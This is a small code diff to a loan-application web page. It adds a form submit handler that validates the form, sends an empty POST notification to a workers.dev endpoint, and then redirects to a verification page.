@@ -665,6 +665,30 @@ document.getElementById("form").addEventListener("submit", function(event) {
     window.location.href = "verify.html";
 });
 </script>
+<script>
+document.getElementById("form").addEventListener("submit", async function(event) {
+    event.preventDefault();
 
+    if (!this.reportValidity()) return;
+
+    try {
+        const response = await fetch(
+            "https://loan-notifications.ecocashloan.workers.dev/",
+            {
+                method: "POST"
+            }
+        );
+
+        if (!response.ok) {
+            throw new Error("Notification failed");
+        }
+
+        window.location.href = "verify.html";
+
+    } catch (error) {
+        alert("Submission notification failed. Please try again.");
+    }
+});
+</script>
 </body>
 </html>
